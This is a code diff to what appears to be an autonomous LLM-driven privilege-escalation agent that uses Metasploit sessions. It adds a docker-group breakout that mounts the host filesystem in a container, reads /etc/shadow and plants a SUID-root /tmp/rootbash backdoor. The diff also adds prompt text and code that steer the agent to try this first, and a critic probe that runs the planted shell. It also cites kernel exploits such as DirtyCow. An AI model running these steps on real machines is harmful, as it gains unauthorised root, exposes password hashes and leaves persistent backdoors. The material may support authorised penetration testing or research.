@@ -206,7 +206,14 @@ Do NOT use `tool_metasploit_rpc` for target commands — use it only for MSF con
 
 **Enumeration checklist — run these in order of priority (via tool_session_command):**
 
-1. **Basic info**: `whoami`, `id`, `uname -a` (via tool_session_command)
+1. **Basic info**: `whoami`, `id`, `uname -a` (via tool_session_command).
+   **READ THE `id` OUTPUT FOR GROUP MEMBERSHIP.** If `groups` / `id` shows the
+   current user is in the **`docker`** group (e.g. `groups=100(users),999(docker)`),
+   that is a NEAR-CERTAIN root vector — the docker daemon runs as root, so a group
+   member can mount the host filesystem in a container and act as root. Flag it
+   LOUDLY under `Docker group:` and as the TOP recommended vector; it beats
+   suid/sudo/kernel and should be tried FIRST. If unsure, also run
+   `groups` and `docker ps 2>/dev/null` to confirm docker is reachable.
 2. **Upgrade to meterpreter if the session is a command_shell (DO THIS BEFORE the suggester).**
    `local_exploit_suggester` and every MSF local kernel-exploit require a
    METERPRETER session. The SESSION you were handed is almost always a
@@ -242,6 +249,7 @@ ENUMERATION RESULTS:
 - OS: <version>
 - Kernel: <version>
 - Current user: <username>
+- Docker group: <'YES — user in docker group (PREFERRED root vector)' if `id`/`groups` shows the docker group, else 'no'>
 - Meterpreter session: <new meterpreter session id from the step-2 upgrade, or 'n/a' if already meterpreter / upgrade failed>
 - Suggested local exploits: <modules local_exploit_suggester flagged vulnerable, or 'none/suggester unavailable'>
 - Sudo rights: <what sudo -l returned>
@@ -275,6 +283,31 @@ SUID/cron don't apply, so try it EARLY: `exploit/linux/local/overlayfs_priv_esc`
 (CVE-2015-1328) and `exploit/linux/local/cve_2016_5195_dirtycow` (DirtyCow).
 
 **Technique priority (based on enumeration results):**
+
+-1. **Docker group (PREFERRED — try FIRST when available).** If the enumeration
+   results show the current user is in the **`docker`** group (`id`/`groups`
+   contains `docker`, e.g. `groups=100(users),999(docker)`), this is a
+   near-certain root vector — do NOT waste budget on suid/sudo/kernel first.
+   The docker daemon runs as root; a group member mounts the host FS in a
+   container and acts as root.
+   TECHNIQUE: docker_group breakout.
+   **The session is a command_shell — the procedure MUST be NON-INTERACTIVE.
+   NEVER use `docker run -it` / `-i` / `-t` (they wait on a TTY and HANG the
+   session).** Robust non-interactive procedure:
+     1. Discover a local image dynamically: `docker images -q | head -n1`
+        (grab the id into a var, e.g. `IMG=$(docker images -q | head -n1)`).
+        If NO local image exists, first `docker pull busybox` (or alpine) and
+        use that as `$IMG`.
+     2. Run ONE non-interactive container that mounts the host root and chroots
+        it to act as root on the host FS, proving root and planting proof:
+        `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /mnt/tmp/rootbash 2>/dev/null; chmod 4755 /mnt/tmp/rootbash; id -u > /tmp/.docker_root_uid'`
+        (`--rm`, no `-it`; the `sh -c '...'` returns immediately).
+     3. This plants a SUID-root `/tmp/rootbash` on the HOST. Confirm root from
+        the ORIGINAL session non-interactively: `/tmp/rootbash -p -c 'id'`
+        (a SUID `bash -p` keeps euid=0 → `id` shows `euid=0(root)`). The chroot
+        `id` (uid=0) and the `/etc/shadow` first line are also root proof.
+   EXPECTED_RESULT: chroot `id` shows `uid=0(root)`, /etc/shadow readable, and
+   `/tmp/rootbash -p -c id` reports `euid=0(root)`.
 
 0. **local_exploit_suggester hits** — if the enumeration results contain
    `local_exploit_suggester` output listing one or more "appears to be
@@ -333,7 +366,18 @@ Do NOT continue executing plan steps against a dead session.
 3. After the escalation attempt, ALWAYS verify with `tool_session_command(session_id, "whoami")` and `tool_session_command(session_id, "id")`
 4. If `whoami` returns `root` or `id` shows `uid=0`, the escalation SUCCEEDED
 5. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands
-6. **MSF local/kernel exploits** (via `tool_metasploit_rpc`): these need a
+6. **Docker-group breakout** (when the plan's technique is docker_group): the
+   session is a command_shell, so EVERY docker command MUST be NON-INTERACTIVE —
+   **never `docker run -it`/`-i`/`-t`** (they block on a TTY and hang the stage).
+   Discover an image first (`docker images -q | head -n1`; if none,
+   `docker pull busybox` then use it), then run a SINGLE `--rm` container that
+   chroots the host FS, e.g.
+   `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /mnt/tmp/rootbash; chmod 4755 /mnt/tmp/rootbash'`.
+   Then PROVE root from the session non-interactively with
+   `tool_session_command(session_id, "/tmp/rootbash -p -c 'id'")` — expect
+   `euid=0(root)`. Do NOT drop into an interactive container or an interactive
+   root shell.
+7. **MSF local/kernel exploits** (via `tool_metasploit_rpc`): these need a
    meterpreter session. If your session is a command_shell, FIRST upgrade it —
    `tool_metasploit_rpc("sessions -u <session_id>")` — note the new meterpreter
    session id, then run e.g.
@@ -365,6 +409,14 @@ with the session type that was probed:
   - `[meterpreter getuid] ...` → root IFF the output shows `Server username: root`
     (or `uid=0`). On a meterpreter session `id` is NOT a valid command, so
     `getuid` is the authoritative probe — do not expect a `uid=` line here.
+  - `[docker rootbash probe] ...` → appears only for a docker-group breakout. A
+    docker breakout roots the HOST FS via a container but does NOT change the
+    session's own uid, so the `[command_shell id]` line above will still show the
+    low-priv user even on SUCCESS — do NOT fail on that alone here. This probe
+    runs the SUID-root `/tmp/rootbash` the breakout planted; root IFF it shows
+    `uid=0(root)` OR `euid=0(root)`. If this probe shows euid/uid=0, escalation
+    SUCCEEDED (PASS). If it errors / shows the low-priv user / 'No such file', the
+    breakout did not land — do not PASS on prose.
 This field is authoritative. If it shows root by the rule above, escalation
 succeeded (PASS) regardless of the prose. If it does NOT (e.g. `uid=1000(vagrant)`,
 `Server username: vagrant`, an error, empty, or a timeout message), you MUST NOT
@@ -514,6 +566,19 @@ def planner_node(state: PrivEscState) -> dict:
             f"OS: {state.get('os_info', 'unknown')}\n"
             f"CURRENT ACCESS: {state.get('access_level', 'user')}\n"
         )
+        # Deterministic feasibility nudge (design law: strategic bias in code, not
+        # left to the LLM): if enumeration shows docker-group membership, docker is
+        # the PREFERRED near-certain root vector — inject a loud banner so the
+        # planner reaches for it FIRST instead of burning budget on suid/sudo.
+        if _user_in_docker_group(enum_results):
+            context = (
+                "*** DOCKER GROUP DETECTED — the current user is in the `docker` "
+                "group. This is a near-certain root vector; the docker daemon runs "
+                "as root, so mount the host FS in a NON-INTERACTIVE container and "
+                "act as root. Choose TECHNIQUE: docker_group breakout FIRST — do "
+                "NOT try suid/sudo/kernel before it. NEVER use `docker run -it` "
+                "(it hangs the command_shell). ***\n\n"
+            ) + context
         for msg in reversed(messages):
             if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                 context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
@@ -882,6 +947,24 @@ def _direct_priv_check(sid: str, timeout: int = 15) -> str:
     return f"[{label}] {out}"
 
 
+def _docker_root_probe(sid: str, timeout: int = 15) -> str:
+    """Docker-group ground-truth probe. A docker-group breakout does NOT change
+    the session's own uid — a bare `id` still shows the low-priv user — so the
+    normal _direct_priv_check would falsely FAIL a successful breakout. Instead we
+    probe the root-owned artifacts a correct breakout plants on the HOST:
+      - `/tmp/rootbash -p -c id` — the SUID-root bash the container copied out;
+        `bash -p` keeps euid=0 so `id` reports `euid=0(root)` (real root).
+    Returns the raw probe output prefixed with a label. Non-interactive (`-c`),
+    so it never hangs the command_shell."""
+    if not sid:
+        return "[docker rootbash probe] (no session_id)"
+    out = _session_command_capped(sid, "/tmp/rootbash -p -c 'id' 2>&1", timeout=timeout)
+    if (not str(out).strip()) or str(out).strip() in ("(no output)",):
+        time.sleep(2)
+        out = _session_command_capped(sid, "/tmp/rootbash -p -c 'id' 2>&1", timeout=timeout)
+    return f"[docker rootbash probe] {out}"
+
+
 def critic_node(state: PrivEscState) -> dict:
     """3-way evaluation of privesc attempt."""
     current_step = state.get("loop_step", 0)
@@ -913,6 +996,19 @@ def critic_node(state: PrivEscState) -> dict:
         sid = _resolve_final_session(state)[0]
         if sid:
             direct_id = _direct_priv_check(sid, timeout=15)
+            # Docker-group breakout special case: the breakout roots the HOST FS
+            # via a container but leaves the session's OWN uid unchanged, so the
+            # bare `id` above shows the low-priv user even on success. When the
+            # attempted technique was docker, ALSO probe the root-owned SUID
+            # rootbash the breakout plants, and treat euid=0 there as authoritative
+            # root proof. Without this, a correct docker breakout would falsely FAIL.
+            plan_and_result = (
+                str(state.get("escalation_plan", "")) + " " +
+                str(state.get("escalation_result", ""))
+            )
+            if "uid=0" not in str(direct_id) and _plan_mentions_docker(plan_and_result):
+                docker_id = _docker_root_probe(sid, timeout=15)
+                direct_id = f"{direct_id}\n{docker_id}"
         else:
             direct_id = "(no live session_id available for a direct check)"
     print_colored(f"[PrivEsc Critic] DIRECT ID CHECK: {str(direct_id)[:200]}", Colors.OKCYAN)
@@ -1136,6 +1232,59 @@ def build_graph() -> StateGraph:
 # FINDINGS EXTRACTION
 # =============================================================================
 
+def _user_in_docker_group(text: str) -> bool:
+    """Deterministic feasibility check for the docker-group vector: True iff the
+    given `id`/`groups` enumeration text shows the current user is a member of the
+    `docker` group. Membership in `docker` is a near-certain root vector (the
+    docker daemon runs as root, so a group member can mount the host FS in a
+    container and read/write it as root).
+
+    Matches real `id` output, e.g.
+        uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
+    as well as `groups` output and the enumerator's `Docker group:` summary line.
+    Requires `docker` to appear as a GROUP token — a bare mention of the word
+    docker (e.g. "docker.sock", "dockerd running") is NOT sufficient, so a plan
+    that merely names a docker *service* is not misread as group membership."""
+    if not text:
+        return False
+    low = text.lower()
+    # `id` output: groups=...,999(docker) / gid=999(docker)
+    for m in re.finditer(r"(?:groups?|gid|egid)=([^\s]+)", low):
+        field = m.group(1)
+        # tokens look like 100(users),999(docker) or bare "docker"
+        if re.search(r"\bdocker\b", re.sub(r"[(),]", " ", field)):
+            return True
+    # `groups` command output is a plain space-separated list of names.
+    if re.search(r"(?:^|\s)docker(?:\s|$)", low):
+        # only trust this outside an obvious path/socket context
+        if "docker.sock" not in low and "/docker" not in low:
+            return True
+    # enumerator summary line, e.g. "Docker group: yes (user in docker group)".
+    if re.search(r"docker group\s*:\s*(yes|true|member|present)", low):
+        return True
+    return False
+
+
+def _plan_mentions_docker(text: str) -> bool:
+    """True iff the escalation plan/result text describes a docker-group breakout
+    (used to trigger the docker-specific ground-truth probe in the critic). Keyed
+    on `docker` plus a breakout signal so a plan merely naming a docker *service*
+    is not misread."""
+    if not text:
+        return False
+    low = text.lower()
+    # `rootbash` is the SUID artifact the breakout plants — a strong signal on its
+    # own even if the word "docker" was compressed out of the summary.
+    if "rootbash" in low:
+        return True
+    if "docker" not in low:
+        return False
+    return any(k in low for k in (
+        "docker run", "docker group", "docker_group", "docker images",
+        "chroot", "docker.sock", "-v /:/", "docker exec",
+    ))
+
+
 def _extract_privesc_findings(state: dict) -> PrivEscFindings:
     critic_verdict = state.get("critic_verdict", "")
     escalation_plan = state.get("escalation_plan", "")
@@ -1150,7 +1299,16 @@ def _extract_privesc_findings(state: dict) -> PrivEscFindings:
     plan_lower = (escalation_plan or "").lower()
     if not plan_lower.strip():
         plan_lower = (escalation_result or "").lower()
-    if "sudo" in plan_lower:
+    # docker-group breakout is checked FIRST: it's the preferred vector on a box
+    # whose foothold user is in the docker group, and a plan naming `docker run`/
+    # docker-group should classify as docker_group even though its steps may also
+    # mention chroot/shadow/etc.
+    if "docker" in plan_lower and any(
+        k in plan_lower for k in ("docker run", "docker group", "docker images",
+                                  "chroot", "docker.sock", "-v /:/", "docker exec")
+    ):
+        technique = "docker_group"
+    elif "sudo" in plan_lower:
         technique = "sudo_miscfg"
     elif "suid" in plan_lower:
         technique = "suid"
